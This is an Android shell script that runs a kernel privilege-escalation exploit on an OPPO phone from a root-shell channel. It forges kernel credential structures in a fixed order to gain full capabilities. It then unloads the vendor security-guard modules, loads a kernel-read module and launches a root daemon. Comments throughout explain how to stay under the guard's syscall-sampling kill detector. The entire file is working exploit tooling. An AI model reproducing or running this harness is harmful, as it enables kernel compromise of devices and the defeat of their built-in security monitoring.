#!/system/bin/sh
# w1c.sh -- W1c self credential write, run *inside* the Magica root-shell channel.
#
#   adb shell sh /data/local/tmp/gl-w1/rshell 'sh /data/local/tmp/gl-w1/w1c.sh'
#
# The exploit has to execute inside the Magica server (uid 0, born root), because
# oplus_security_guard's root policy only watches uid/gid *transitions*: a process
# that is already root and merely gains capabilities is not its business, while
# crediting a born-non-root process (adbd, an app) is exactly what it kills.  An
# adb-shell client also keeps the app-zygote bounding set (0x8000c0), so it can
# neither load a module nor open /proc/kread.
#
# Stage order -- all of it load-bearing, see docs/analysis/w1c-forged-cred-20260926.md
#   R1     cred write  task+0x798 (cred, SUBJECTIVE).  Must be first: capable()
#          reads current->cred, so this is the write that grants the caps.
#   R2     cred write  task+0x790 (real_cred).  Writing real_cred first instead
#          leaves the process looking capless (measured: the next spray's
#          sched_setaffinity came back EPERM and SYSCHK killed the process).
#   PROOF  /proc/<pid>/status Uid/Cap* into the log      (0 routes)
#   PRE    rmmod oplus_security_guard -> oplus_secure_harden
#              -> oplus_security_keventupload            (0 routes; refcounts are
#          guard 0, harden "used by guard", kevent "used by guard+harden", so the
#          unload order is the reverse of the dependency chain)
#   KO     finit_module kread_min.ko                     (0 routes)
#   then   park + PARK_CMD (ksud late-load) + the out-of-process PI cleanup
#
# Everything here runs after the credential store with the shortest possible
# exposure window: the guard's ROOTCHECK-RC branch kills a rooted process on a
# syscall it samples (its payload shows old/curr uid 0/0, so it is not the uid
# policy; observed kill points differ between runs, so it samples rather than
# counting).  Anything that costs an extra route -- the init_cred repair in
# particular -- has to come after the rmmod, not before it.
#
# NEVER run w1c.sh.adbd.bak: crediting adbd writes a credential into a
# born-non-root process, which is the one transition the guard is looking for.
#
# GHOSTLOCK_CRED_FROM_COPY=1 installs the credential template that lives inside
# the payload page instead of the global init_cred.  The credential word doubles
# as the forged rb-tree child pointer, so the walk also stores 8 bytes into the
# object it points at: with value == &init_cred that lands in init_cred.usage,
# i.e. the identity of PID 1 and of every later prepare_kernel_cred(NULL) copy,
# and it forces a second repair route plus refcount keepers.  Defaults to 1 when
# the binary supports the knob; set it to 0 to get the old behaviour back.

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1c.log"
KO="$DIR/kread_min.ko"                 # NOT /sdcard: that copy is u0_a299:media_rw
                                       # 0660 and a capless uid-0 process gets
                                       # EACCES on it ([ -f ] already fails).
PRE_CMD="/system/bin/rmmod oplus_security_guard; /system/bin/rmmod oplus_secure_harden; /system/bin/rmmod oplus_security_keventupload"
PARK_CMD="/data/adb/ksud late-load"
TIMEOUT_S="${W1C_TIMEOUT_S:-180}"

# ---- knob default -----------------------------------------------------------
if [ -z "${GHOSTLOCK_CRED_FROM_COPY:-}" ] && grep -qa GHOSTLOCK_CRED_FROM_COPY "$DIR/ghostlock" 2>/dev/null; then
    GHOSTLOCK_CRED_FROM_COPY=1
fi
export GHOSTLOCK_CRED_FROM_COPY

# ---- hard gates -------------------------------------------------------------
# A wrong context here is exactly the case the guard reacts to, so refuse to run.
if [ "$(id -u)" != "0" ]; then
    echo "W1c: REFUSING -- uid=$(id -u), not the Magica root-shell channel."
    echo "      adb shell sh $DIR/rshell 'sh $DIR/w1c.sh'"
    exit 3
fi
ENF=$(cat /sys/fs/selinux/enforce 2>/dev/null)
if [ "$ENF" != "0" ]; then
    echo "W1c: REFUSING -- SELinux enforce=$ENF: W1 has not landed on this boot."
    echo "      Without permissive, rmmod/insmod//proc/kread are all denied by SELinux."
    echo "      Run: sh $DIR/w1.sh   first (and re-run it after every reboot)."
    exit 4
fi
if [ ! -r "$KO" ]; then
    echo "W1c: REFUSING -- $KO is not readable by uid 0 without caps."
    echo "      ls -l $KO  -> needs owner root (or mode 0644)."
    exit 5
fi
if [ ! -x "$DIR/ghostlock" ] || [ ! -f "$DIR/profile.bin" ]; then
    echo "W1c: REFUSING -- $DIR/ghostlock or $DIR/profile.bin missing"
    exit 6
fi
[ -x /data/adb/ksud ] || echo "W1c: WARNING /data/adb/ksud is not executable -- PARK_CMD will fail"
# The exploit rewrites its root script on every start; it can only do that if the
# file is writable by uid 0 *without* capabilities (umask 022 leaves 0755).
[ -w "$DIR/.ghostlock_root.sh" ] || {
    echo "W1c: NOTE -- $DIR/.ghostlock_root.sh is not writable in this context"
    echo "      (EACCES on rewrite; the W1-generated copy is used instead)."
    echo "      Fix from adb shell: chmod 666 $DIR/.ghostlock_root.sh"
}

# ---- environment ------------------------------------------------------------
cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_SELF_ROOT=1           # target self (perf pid=0), not adbd
export GHOSTLOCK_W1C_ONLY=1            # stop right after the credential stages
export GHOSTLOCK_PARK_AFTER_W1=1       # park: a plain exit walks the forged PI tree
export GHOSTLOCK_PRE_CMD="$PRE_CMD"    # rmmod the OPPO modules before loading anything
export GHOSTLOCK_LOAD_KO="$KO"         # finit_module from *this* process
export GHOSTLOCK_PARK_CMD="$PARK_CMD"  # runs after cleanup, before the process dies
export GHOSTLOCK_FINISH=1              # the parked process cleans itself up
                                       # (one cleanup implementation; it kills us
                                       # only after it verified the erase)

echo "W1c: uid=0 enforce=0 cred_from_copy=${GHOSTLOCK_CRED_FROM_COPY:-0} timeout=${TIMEOUT_S}s"
echo "W1c: binary $(md5sum "$DIR/ghostlock" 2>/dev/null | cut -d' ' -f1) $(ls -l "$DIR/ghostlock" 2>/dev/null | awk '{print $5}') bytes"
echo "W1c: pre=$PRE_CMD"
echo "W1c: ko=$KO park=$PARK_CMD"
echo "W1c: route budget is small -- the guard samples syscalls and kills rooted processes"

# ---- run --------------------------------------------------------------------
# Create the log ourselves (root:0600 used to make post-mortems impossible from
# adb shell) and keep it world-readable.
: >"$LOG" 2>/dev/null || { echo "W1c: cannot create $LOG"; exit 1; }
chmod 666 "$LOG" 2>/dev/null

snap() {   # snap <stage>: keep the kernel side of the story next to the log
    dmesg 2>/dev/null | grep -E 'ROOTCHECK|HS-ERROR|HS-INFO' >"$DIR/dmesg.$1.log" 2>/dev/null
    echo "W1c: dmesg.$1.log: $(grep -c . "$DIR/dmesg.$1.log" 2>/dev/null) line(s)"
}

setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1c: started pid=$PID (log: $LOG)"

seen=0; i=0; proof=0; seen_pre=0; seen_ko=0; seen_repair=0; warned=0
while [ "$i" -lt "$TIMEOUT_S" ]; do
    total=$(wc -l <"$LOG" 2>/dev/null); [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi

    routes=$(grep -c 'multicast route status=' "$LOG" 2>/dev/null)
    [ -z "$routes" ] && routes=0

    # --- self proof: the only direct evidence that the credential store landed ---
    if [ "$proof" = 0 ] && [ "$routes" -ge 2 ]; then
        proof=1
        echo "W1c: PROOF after $routes route(s) -- /proc/$PID/status:"
        grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs)' "/proc/$PID/status" 2>/dev/null ||
            echo "W1c: PROOF FAILED -- pid $PID is already gone"
        if grep -q '^CapEff:.*000001ffffffffff' "/proc/$PID/status" 2>/dev/null; then
            echo "W1c: PROOF full caps (CapEff 0x1ffffffffff) -- credential store landed"
        else
            echo "W1c: PROOF WARNING CapEff is not full -- see the W1c lines in $LOG"
            tail -5 "$LOG" 2>/dev/null
        fi
    fi

    if [ "$warned" = 0 ] && [ "$routes" -ge 2 ]; then
        warned=1
        echo "W1c: $routes routes used -- PRE_CMD must already have unloaded the guard"
        echo "      before anything spends another one (the ROOTCHECK-RC sampler kills)."
    fi

    [ "$seen_pre" = 0 ]    && grep -q 'PRE_CMD:' "$LOG" 2>/dev/null && { seen_pre=1; snap pre; }
    [ "$seen_ko" = 0 ]     && grep -q 'LOAD_KO:' "$LOG" 2>/dev/null && { seen_ko=1; snap ko; }
    [ "$seen_repair" = 0 ] && grep -qE 'init_cred repair|forged credential installed' "$LOG" 2>/dev/null && { seen_repair=1; snap repair; }

    if grep -q "W1c-only complete" "$LOG" 2>/dev/null; then
        echo "W1c: DONE -- parked pid=$PID (do NOT kill it)"
        grep -E '^(Uid|CapInh|CapPrm|CapEff|CapBnd|CapAmb)' "/proc/$PID/status" 2>/dev/null
        grep -E 'PRE_CMD:|LOAD_KO:|wrote .*parked\.d|forged credential' "$LOG" 2>/dev/null
        snap done
        echo "W1c: erase the forged PI state first, then PARK_CMD runs:"
        echo "      sh $DIR/gl-chain.sh --apply"
        exit 0
    fi

    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1c: process $PID is GONE before completing -- last lines:"
        tail -6 "$LOG"
        snap killed
        if grep -q 'ROOTCHECK-RC-ERROR' "$DIR/dmesg.killed.log" 2>/dev/null; then
            echo "W1c: CAUSE = oplus_security_guard ROOTCHECK-RC 'Kill the process of escalation'"
            echo "      (it samples syscalls of rooted processes -- see dmesg.killed.log)"
        else
            echo "W1c: no ROOTCHECK-RC record -- check dmesg.killed.log and the log tail"
        fi
        echo "W1c: NOTE -- a fully rooted process that dies costs init_cred.usage -2"
        echo "      (exit_creds puts both cred and real_cred, we never get_cred'd) when"
        echo "      cred_from_copy=0; with cred_from_copy=1 the credential lives in our"
        echo "      own page and nothing global is touched."
        exit 1
    fi

    sleep 1
    i=$((i + 1))
done

echo "W1c: still running after ${TIMEOUT_S}s (pid=$PID); see $LOG"
snap timeout
exit 2
